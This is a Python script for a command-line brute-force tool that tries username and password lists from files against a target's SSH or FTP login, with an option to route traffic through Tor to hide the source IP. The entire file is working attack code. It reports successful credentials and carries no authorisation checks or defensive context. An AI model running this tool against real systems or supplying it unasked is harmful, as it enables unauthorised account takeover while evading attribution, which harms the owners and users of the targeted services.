import argparse
import time
import paramiko
from ftplib import FTP, error_perm
from colorama import Fore, init
import requests
import socks
import socket

init(autoreset=True)


def current_timestamp():
    return f"{Fore.WHITE}[{Fore.YELLOW}{time.strftime('%H:%M:%S', time.localtime())}{Fore.WHITE}]{Fore.RESET}"


def set_up_tor():
    print(f"{Fore.WHITE}[{Fore.YELLOW}INFO{Fore.WHITE}]{Fore.RESET} INITIALIZING TOR PROXY...")
    old_ip = get_public_ip()
    socks.set_default_proxy(socks.SOCKS5, "localhost", 9050)
    socket.socket = socks.socksocket
    new_ip = get_public_ip()
    print(f"{Fore.WHITE}[{Fore.YELLOW}INFO{Fore.WHITE}]{Fore.RESET} Old IP: {Fore.LIGHTBLUE_EX}{old_ip}")
    print(f"{Fore.WHITE}[{Fore.YELLOW}INFO{Fore.WHITE}]{Fore.RESET} New IP (via Tor): {Fore.LIGHTBLUE_EX}{new_ip}")
    time.sleep(1.5)

def get_public_ip():
    """Get the public IP address."""
    try:
        response = requests.get('https://api.ipify.org')
        return response.text
    except requests.RequestException:
        return "Unknown IP"


def load_usernames_from_file(filename):
    with open(filename, encoding='latin-1') as file:
        return file.read().splitlines()


def parse_arguments():
    parser = argparse.ArgumentParser(description='Brute force against SSH and FTP services.')
    parser.add_argument('--service', required=True, choices=['ftp', 'ssh'],
                        help="Service to attack. Choose 'ftp' or 'ssh'.")
    parser.add_argument('-w', '--wordlist', required=True, help="Password Wordlist.")
    parser.add_argument('-u', '--users', required=True, help="File containing a list of usernames.")
    parser.add_argument('--ip', required=True, type=str, help="IP address of the target.")
    parser.add_argument('--tor', action='store_true', help="Use Tor for anonymization")
    return parser.parse_args()


def ssh_attack(ip, user, password):
    client = paramiko.SSHClient()
    client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
    try:
        client.connect(ip, username=user, password=password, timeout=5)
        print(current_timestamp(), f"Success for [*]{user}[*]:{Fore.GREEN}{password}")
        return True
    except paramiko.AuthenticationException:
        return False
    except Exception as e:
        print(current_timestamp(), f"{Fore.RED}Error with SSH: {e}")
        return False
    finally:
        client.close()


def ftp_attack(ip, user, password):
    try:
        with FTP(ip, timeout=5) as ftp:
            ftp.login(user, password)
            print(current_timestamp(), f"Success for [*]{user}[*]:{Fore.GREEN}{password}")
            return True
    except error_perm as e:
        if str(e).startswith('530 '):
            return False
        else:
            print(current_timestamp(), f"{Fore.RED}FTP error: {e}")
            return False


if __name__ == '__main__':
    print(current_timestamp(),"STARTING ATTACK...")
    time.sleep(0.5)
    args = parse_arguments()

    if args.tor:
        set_up_tor()

    with open(args.wordlist, 'r') as f:
        passwords = f.read().splitlines()

    with open(args.users, 'r') as f:
        users = f.read().splitlines()

    password_chunk_size = 3
    for i in range(0, len(passwords), password_chunk_size):
        for user in users:
            for j in range(password_chunk_size):
                if i + j >= len(passwords):
                    break
                password = passwords[i + j]
                print(current_timestamp(), f"Trying user [*]{user}[*] with password:{Fore.YELLOW} {password}")

                if args.service == 'ssh':
                    if ssh_attack(args.ip, user, password):
                        print(current_timestamp(), f"Password found for [*]{user}[*]:{Fore.GREEN}{password}")
                        users.remove(user)  # remove user from list if password is found
                        break
                elif args.service == 'ftp':
                    if ftp_attack(args.ip, user, password):
                        print(current_timestamp(), f"Password found for [*]{user}[*]: {Fore.GREEN}{password}")
                        users.remove(user)  # remove user from list if password is found
                        break

    print(current_timestamp(), f"{Fore.BLUE}Brute force completed.")
